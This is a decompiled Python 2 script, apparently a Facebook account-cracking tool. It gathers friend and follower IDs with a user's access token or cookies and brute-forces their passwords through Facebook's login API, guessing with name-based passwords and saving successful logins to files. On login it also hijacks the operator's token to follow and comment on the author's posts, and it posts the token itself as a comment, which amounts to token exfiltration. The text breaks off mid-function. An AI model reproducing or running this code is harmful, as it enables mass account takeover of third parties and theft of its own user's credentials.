# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os
try:
    import requests
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Requests Module not Installed'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Futures Module not Installed'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Bs4 Module not Installed'
    os.system('pip2 install bs4')

import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {'01': 'Januari', 
   '02': 'Februari', 
   '03': 'Maret', 
   '04': 'April', 
   '05': 'Mei', 
   '06': 'Juni', 
   '07': 'Juli', 
   '08': 'Agustus', 
   '09': 'September', 
   '10': 'November', 
   '11': 'Oktober', 
   '12': 'Desember'}
p = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;34m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
P = '\x1b[1;93m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;97m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
ok = []
cp = []
id = []
user = []
loop = 0
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
zkid = '100002151005321'
zkid1 = '100045165501610'
zkid2 = '1675627047'
zscomments = random.choice(['Great\xf0\x9f\x8c\xb9', 'Nice\xf0\x9f\x8c\xb9', 'Ossum\xf0\x9f\x8c\xb9', 'Perfect\xf0\x9f\x8c\xb9'])
reac = 'CARE'
zkpost = '4253981448016847'
zkpost1 = '348166760032171'
zkpost2 = '10216920287314188'
pageid = '101158528390502'

def zks(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def exitp():
    zks('\x1b[1;91m  [!] \x1b[1;91mExiting Program...\x1a\x1a\x1a')
    os.sys.exit()


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s' % (N, M, N, x),
        sys.stdout.flush()
        time.sleep(1)


logo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP """
loginlogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP 
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
cookieslogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
tokenlogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
idPasslogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
cracklogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
crackinglogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
checkerlogo = """
\033[1;37m     .d8b.  db      \033[1;32md8888b. \033[1;37mdb    db 
\033[1;37m    d8' `8b 88      \033[1;32mVP  `8D \033[1;37m`8b  d8' 
\033[1;30m    88ooo88 88        \033[1;32moooY'  \033[1;30m`8bd8'  
\033[1;30m    88~~~88 88        \033[1;32m~~~b.  \033[1;30m.dPYb.  
\033[1;37m    88   88 88booo. \033[1;32mdb   8D \033[1;37m.8P  Y8. 
\033[1;37m    YP   YP Y88888P \033[1;32mY8888P' \033[1;37mYP    YP
\033[1;97m--------------------------------------------
    [\033[1;97m\033[1;41m IF YOU DREAM IT CAN YOU DO IT \033[0m]
\033[1;97m--------------------------------------------
\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )
\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 
\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420
\033[1;97m--------------------------------------------"""
def results(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print ''
        print '\033[1;97m--------------------------------------------'
        zks('  \033[1;97mTotal Cracked FB Idz: \x1b[0;92m' + str(len(ok)) + '\x1b[0;97m/' + str(len(cp)))
        zks('  \033[1;97mTotal Cracked OK Idz: \x1b[0;92m' + str(len(ok)))
        zks('  \033[1;97mTotal Cracked CP Idz: \x1b[0;97m' + str(len(cp)))
        print'\033[1;97mCracked Idz Has Been Saved In Cracked Folder  '
        print '\033[1;97m--------------------------------------------'
        raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Press Any Key To Go Back To Cracking Menu: ')
        cracking_menu()
    else:
        print '\n\x1b[0;97m No Cracked Idz Found!'
        cracking_menu()


def zkbot():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m Removing Token..! Login Again')
        zmbf()

    zks('\x1b[0;97m Wait! Plz wait some time to Login')
    requests.post('https://graph.facebook.com/1675627047/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002151005321/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid1 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + zkid2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/reactions?type=' + reac + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost2 + '/comments/?message=' + zscomments + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + zkpost1 + '/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + pageid + '/subscribers?access_token=' + token)
    cracking_menu()


def login():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;97m--------------------------------------------'
        print '\033[1;37m  \033[1;37m-> \033[1;37mAUTHOR   \033[1;37m: \033[1;37mRISHU KHAN ( AL3X )'
        print '\033[1;37m  \033[1;37m-> \033[1;37mVERSION  \033[1;37m: \033[1;37m3.0 '
        print '\033[1;37m  \033[1;37m-> \033[1;37mFACEBOOK \033[1;37m: \033[1;37mwww.fb.com/Rishu.X.420'
        print '\033[1;97m--------------------------------------------'
    zk = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Enter Password -> \033[1;32m')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        login()
    elif zk == 'Alex' or zk == 'alex':
        zmbf()
    else:
        print '  \033[1;31m[!] Wrong Input! Try Again'
        time.sleep(2)
        login()


def zmbf():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print loginlogo
        print '[\033[1;97m\033[1;41m---------------LOGIN MENU---------------\033[0m] '
        print '------------------------------'
        print '   [1] Login Using FB ID Access Token   '
        print '   [2] Login Using FB ID Cookies  '
        print '   [3] Exit Program '
        print '-------------------------------'

    zk = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Choose -> \033[1;32m')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        zmbf()
    elif zk == '1' or zk == '01':
        tokenz()
    elif zk == '2' or zk == '02':
        cookies()
    elif zk == '3' or zk == '03':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        zmbf()


def cookies():
    os.system('clear')
    print cookieslogo
    print '[\033[1;97m\033[1;41m---------Login Using FB ID Cookies--------\033[0m]   '
    print '--------------------------------------------'
    cookies = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Cookies -> \x1b[0;92m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookies})
        find_token = re.search('(EAAA\\w+)', data.text)
        results = ' \x1b[0;97m Invalid Cookies' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m no Connection'

    cookies = open('login.txt', 'w')
    cookies.write(find_token.group(1))
    cookies.close()
    zks('\033[1;97m[\033[1;92m*\033[1;97m] Login Successfull')
    os.system('xdg-open https://facebook.com/Rishu.X.420')
    zkbot()
    return


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        cracking_menu()
    except (KeyError, IOError):
        print tokenlogo
        print '[\033[1;97m\033[1;41m------Login Using FB ID Access Token------\033[0m]  '
        print '\033[1;97m--------------------------------------------'
        
    token = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Token -> \x1b[0;92m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(token)
        zedd.close()
        zks('\033[1;97m[\033[1;92m*\033[1;97m] \x1b[0;92mLogin Successfull')
        os.system('xdg-open htpps://facebook.com/Rishu.X.420')
        zkbot()
    except KeyError:
        zks(' \033[1;31mInvalid Token')
        tokenz()


def cracking_menu():
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        zks(' \x1b[0;97m Removing Token..! Login Again')
        os.system('clear')
        os.system('rm -rf login.txt')
        zmbf()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        z = json.loads(otw.text)
        nama = z['name']
        id = z['id']
        dob = z['birthday']
        gender = z['gender']
    except KeyError:
        os.system('clear')
        zks(' \x1b[0;97m Removing Token..! Login Again')
        os.system('rm -rf login.txt')
        zmbf()
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;97m No Internet Connection! Try Again')

    print logo
    print '\x1b[0;97m--------------------------------------------'
    print '  \033[1;97m[\033[1;92m*\033[1;97m] Name        : \x1b[0;92m' + H + H + '%s' % nama
    print '  \033[1;97m[\033[1;92m*\033[1;97m] User ID     : \x1b[0;92m' + H + id
    print '  \033[1;97m[\033[1;92m*\033[1;97m] User Dob    : \x1b[0;92m' + H + dob
    print '  \033[1;97m[\033[1;92m*\033[1;97m] User Gender : \x1b[0;92m' + H + gender
    print '\x1b[0;97m--------------------------------------------'
    print '[\033[1;97m\033[1;41m--------------Cracking Menu---------------\033[0m] '
    print '--------------------------------------------'
    print ' [01] Crack From Friends '
    print ' [02] Crack From Public '
    print ' [03] Crack From Followers '
    print ' [04] Crack From Public Followers '
    print ' [05] Check Cracked Checkpoint Accounts '
    print ' [06] Follow Me On Facebook '
    print ' [eE] Exit Program  '
    print '--------------------------------------------'
    zk = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Choose -> \033[1;32m')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        cracking_menu()
    elif zk == '1' or zk == '01':
        friends(token)
    elif zk == '2' or zk == '02':
        public(token)
    elif zk == '3' or zk == '03':
        myfoll(token)
    elif zk == '4' or zk == '04':
        pfoll(token)
    elif zk == '5' or zk == '05':
        relogin()
    elif zk == '6' or zk == '06':
        os.system('xdg-open https://facebook.com/Rishu.X.420')
        cracking_menu()
    elif zk == '7' or zk == '07':
        os.system('xdg-open https://facebook.com/Rishu.X.420')
        cracking_menu()
    elif zk == '8' or zk == '08':
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
        cracking_menu()
    elif zk == '9' or zk == '09':
        os.system('rm -f login.txt')
        zks('  \x1b[0;97m Removing Token..! Login Again')
        zmbf()
    elif zk == 'e' or zk == 'E':
        exitp()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        cracking_menu()


def friends(token):
    os.system('clear')
    print cracklogo
    print '[\033[1;97m\033[1;41m-----------Cracking From Friends----------\033[0m] '
    print '--------------------------------------------'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Your Name : ' + sp['name'])
    except KeyError:
        print '\x1b[0;91mUser Id Not Found!'
        time.sleep(2)
        friends(token)

    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token=%s' % token).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Your Total Friends IDz : %s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mFriends Idz Not Found! Try Again!'
        time.sleep(2)
        friends()


def myfoll(token):
    os.system('clear')
    print cracklogo
    print '[\033[1;97m\033[1;41m---------Cracking From Followers----------\033[0m] '
    print '--------------------------------------------'
    try:
        pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\033[1;97m[\033[1;92m*\033[1;97m]Your Name : \033[1;32m' + sp['name'])
    except KeyError:
        print ' \033[1;31mUser Id Not Found!'
        time.sleep(2)
        myfoll(token)

    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/me/subscribers?limit=20000&access_token=%s' % token).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Your Total Followers : \033[1;32m%s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print ' \033[1;31mFollowers Idz Not Found! Try Again!'
        time.sleep(2)
        myfoll()


def public(token):
    os.system('clear')
    print cracklogo
    print '[\033[1;97m\033[1;41m----------Cracking From Public ID---------\033[0m] '
    print '--------------------------------------------'
    idt = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Public ID -> \033[1;32m')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Target Name : \033[1;32m' + sp['name'])
    except KeyError:
        print '\033[1;31mPublic Id Not Found!'
        time.sleep(2)
        public(token)

    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s' % (idt, token)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Total Public IDs : \033[1;32m%s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '  \033[1;31m Public Idz Not Found! Try Again!'
        time.sleep(2)
        public()


def pfoll(token):
    os.system('clear')
    print cracklogo
    print '[\033[1;97m\033[1;41m-----Cracking From Public Followers------\033[0m]  '
    print '--------------------------------------------'
    idt = raw_input('\033[1;97m[\033[1;92m*\033[1;97m]Public ID -> \033[1;32m')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Target Name : \033[1;32m' + sp['name'])
    except KeyError:
        print ' \033[1;31mPublic Id Not Found!'
        time.sleep(2)
        public(token)

    try:
        filen = (sp['first_name'] + '.json').replace(' ', '_')
        zk = open(filen, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s' % (idt, token)).json()['data']:
            id.append(a['id'] + '<=>' + a['name'])
            zk.write(a['id'] + '<=>' + a['name'] + '\n')

        zk.close()
        zks('\033[1;97m[\033[1;92m*\033[1;97m] Total Public Followers : \033[1;32m%s' % len(id))
        return crackz(filen)
    except (KeyError, IOError):
        os.remove(file)
        print '   \033[1;31mPublic Followers Not Found! Try Again!'
        time.sleep(2)
        pfoll()


def crackz(file):
    print '\x1b[0;97m--------------------------------------------'
    print ' [01] Start Cracking  Process   '
    print ' [02] Go Back To Cracking Menu  '
    print '\x1b[0;97m--------------------------------------------'
    zk = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Choose -> \033[1;32m')
    if zk == '':
        print '  [!] Choose An Option'
        time.sleep(2)
        crackz(file)
    elif zk == '1' or zk == '01':
        crackmenu(file).passmenu(file)
    elif zk == '2' or zk == '02':
        cracking_menu()
    else:
        print '  [!] Wrong Input! Try Again'
        time.sleep(2)
        crackz(file)


class crackmenu:

    def __init__(self, isifile):
        self.id = []

    def passmenu(self, isifile):
        os.system('clear')
        print crackinglogo
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print ' File Not Found! Try Again'
            time.sleep(2)
            crackmenu().passmenu()

        print '--------------------------------------------'
        print ' [01]. Auto Passwords '
        print ' [02]. Choose Passwords '
        print '--------------------------------------------'
        zk = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Choose -> \033[1;32m')
        if zk in ('M', 'm', '2', '02'):
            os.system('clear')
            print cracklogo
            print '\x1b[0;97m Enter Password Like: 786786,000786,102030'
            while True:
                pwx = raw_input('\033[1;97m[\033[1;92m*\033[1;97m] Enter Choose Password -> \033[1;31m')
                zks('\x1b[0;97mApplying Passwords: \x1b[0;92m%s' % pwx)
                print '--------------------------------------------'
                if pwx == '':
                    zks(' \033[1;31mPassword Can Not Be Empty')
                elif len(pwx) <= 5:
                    zks(' \033[1;31mPassword Must Be Six Digits or Characters Long')
                else:

                    def zkth(zsc=None):
                        global cp
                        global ok
                        with zthreads(max_workers=30) as (form):
                            for uid in self.id:
                                try:
                                    userid = uid.split('<=>')[0]
                                    form.submit(self.api, userid, zsc)
                                except:
                                    pass

                        os.remove(self.apk)
                        results(ok, cp)

                    zkth(pwx.split(','))
                    break

        elif zk in ('D', 'd', '1', '01'):
            os.system('clear')
            print loginlogo
            print ("\033[1;97mPlease Wait Some time Cloning has been start")
            print '[\033[1;97m\033[1;41m-------------Cracking Started-------------\033[0m] '
            print '--------------------------------------------'

            self.passwords()
        else:
            print '  [!] Wrong Input! Try Again'
            time.sleep(2)
            crackmenu().passmenu()
        return

    def api(self, user, zkth):
        global loop
        (
         sys.stdout.write('\r[\xe2\x9e\xa5] Cracking: %s/%s \xe2\x9e\xa4 OK:%s \xe2\x9e\xa4 CP:%s ' % (loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in zkth:
            pw = pw.lower()
            try:
                os.mkdir('Cracked')
            except:
                pass

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print("\r%s[Al3X-OK] %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s" % (H, user, pw, N))
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    loginz = open('login.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                    az = json.loads(ak.text)
                    dob = az['birthday'].replace('/', '-')
                    print("\r%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m%s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;90m%s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;92m%s  %s" % (K, user, pw, dob, N))
                    wrt = '%s | %s | %s' % (user, pw, dob)
                    cp.append(wrt)
                    open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    dob = ''
                except:
                    pass
                print("\r%s\x1b[1;97m[\x1b[1;91mAL3X-CP\x1b[1;97m]\033[1;30m %s \x1b[1;97m\xe2\x9e\xa4 \x1b[1;90m%s  %s" % (K, user, pw, N))
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def passwords(self):
        with zthreads(max_workers=30) as (form):
            for uname in self.id:
                try:
                    zz = uname.split('<=>')
                    xz = zz[1].split(' ')
                    if len(xz) >= 5:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3] + ' ' + xz[4]]
                    elif len(xz) <= 1:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + ' ' + xz[1]]
                    elif len(xz) <= 2:
                        pws = [
